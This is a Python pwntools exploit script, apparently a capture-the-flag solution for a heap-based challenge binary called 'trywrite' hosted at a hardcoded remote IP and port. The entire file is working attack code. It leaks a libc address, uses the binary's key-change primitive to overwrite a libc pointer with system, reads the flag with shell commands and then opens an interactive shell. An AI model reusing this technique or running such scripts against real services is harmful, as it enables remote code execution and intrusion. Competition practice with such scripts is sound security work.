#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'critical'
BINARY = './trywrite'
TARGET = ('117.78.28.89', 31589)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

r = None
 
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def add_msg(key, date):
    r.sendlineafter('command>>', '1')
    assert len(key) == 16
    r.sendafter('Please tell me the key:', key)
    r.sendlineafter('Please tell me the date:', date)

def show_msg(idx):
    r.sendlineafter('command>>', '2')
    r.sendlineafter('Please tell me the index:\n', str(idx))

def del_msg(idx):
    r.sendlineafter('command>>', '3')
    r.sendlineafter('Please tell me the index:', str(idx))

def chg_msg(a1, a2, key):
    r.sendlineafter('command>>', '4')
    r.sendlineafter('Give me how far the first key is from your heap:', str(a1))
    r.sendlineafter('Give me how far the second key is from the first key:', str(a2))
    r.sendafter('Please tell me the new key:', key)

import tea

def exploit():
    global r
    context.log_level = 'critical'
    r = remote(TARGET[0], TARGET[1])
    #r = process(BINARY)

    code = ELF(BINARY)
    libc = ELF(LIBC64)
    
    #attach(0x1652)
    
    r.sendlineafter('Please tell me where is your heap:', "%d" % 0x10000)
    r.sendlineafter('Do you want to tell me your name now?(Y/N)', 'Y')
    p = p64(0)
    p += p64(0x10020)
    p += '/bin/sh\x00'
    r.sendline(p)
    
    for i in xrange(8):
        add_msg('a'*16, 'a'*80)
    
    for i in xrange(8):
        del_msg(7-i)
    
    for i in xrange(8):
       add_msg('a'*16, '')
    
    show_msg(7)
    data = r.recv(0x80)
    #print data.encode('hex')
    libc.address = u64(tea.str_decrypt(data, 'a'*16)[:8]) - 0x3ebc00
    print "%#x" % libc.address
    
    try:
        #chg_msg(libc.sym['__free_hook'] - 0x10000, 0x30001, p64(0x10000)+p64(0xdeadbeaf))
        chg_msg(libc.address + 0x6154a8 - 0x10000, 0x30001, p64(0x10010)+p64(libc.sym['system']))
        r.recvuntil('How dare you play with me?\n')

        context.log_level = 'debug'
        r.sendline('echo xxd;cat /flag;ls /')   
        r.recvuntil('xxd\n')
        flag = r.recvline()
        print flag
        print flag
        print flag
        print flag
        print flag
        print flag
        print r.recvline()
        print r.recvline()
        print r.recvline()
        print r.recvline()
        r.interactive()
    except Exception as e:
        print e
        pass

exploit()
